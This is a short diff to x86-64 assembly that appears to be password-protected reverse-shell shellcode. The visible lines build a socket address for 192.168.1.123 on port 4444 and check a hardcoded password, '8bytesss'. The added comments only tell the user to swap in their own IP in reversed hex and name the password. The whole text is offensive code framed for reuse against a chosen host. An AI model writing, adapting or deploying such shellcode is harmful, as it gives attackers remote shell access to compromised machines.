@@ -16,7 +16,8 @@ _start:
         xor rax, rax
 
         push rax
-        mov dword [rsp-4], 0x7b01a8c0 ;0xc0a8017b
+        ; change IP as reverse hex as needed
+        mov dword [rsp-4], 0x7b01a8c0
         mov word [rsp-6], 0x5c11
         mov word [rsp-8], 0x2
         sub rsp, 8
@@ -51,6 +52,7 @@ _start:
         syscall
 
         xor rax, rax
+        ; password '8bytesss'
         mov rax, 0x7373736574796238
         mov rdi, rsi
         scasq
